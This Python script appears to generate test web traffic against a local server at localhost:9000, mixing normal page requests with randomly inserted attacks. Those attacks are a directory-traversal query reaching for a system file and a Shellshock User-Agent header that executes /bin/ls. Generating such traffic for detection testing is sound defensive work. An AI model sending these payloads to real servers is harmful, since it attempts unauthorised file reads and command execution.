#!/usr/bin/env python3

import requests
from numpy.random import *
from numpy import *

TERGET_URL = 'http://localhost:9000'
URL_PATH = [
    '/',
    '/hoge.html',
    '/fuga.html',
    '/piyo.html',
]
HACK_URL_PATH = [
    '/file.html?path=../../../../../../etc/password',
]
USER_AGENT = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15',
    'python-requests/2.19.1',
]
HACK_USER_AGENT = [
    '(){:;} echo Content-type:text/plain;echo;/bin/ls'
]
METHOD = [
    'get',
    'post',
]
def sendReq(session, headers, url_path=random.choice(URL_PATH), method=random.choice(METHOD)):
    getattr(session, method)(TERGET_URL + url_path, headers=headers)

total_access = 0
total_hack = 0
for _ in range(randint(10)):
    total_access = total_access + 1
    hack_flag = random.choice([True, False])
    hack_code = random.choice(['directory-traversal', 'shell-shock'])
    total_hack = total_hack + hack_flag
    s = requests.Session()
    headers = {'User-Agent': random.choice(USER_AGENT)}
    j_max = randint(3,11) # 3-10の値を生成
    j_status = [''] * (j_max - hack_flag) # 乱数分の配列を生成 ただし、hack_flagがオンのときは一つ少ない
    if hack_flag:
        j_status.insert(randint(j_max - 2), 'hack')
    for status in j_status:
        if status == 'hack':
            if hack_code == 'shell-shock':
                hack_headers = {'User-Agent': random.choice(HACK_USER_AGENT)}
                sendReq(session=s, headers=hack_headers)
            else:
                sendReq(session=s, headers=headers, url_path=random.choice(HACK_URL_PATH))
        else:
            sendReq(session=s, headers=headers)
print('total_access = {}'.format(total_access))
print('total_hack = {}'.format(total_hack))
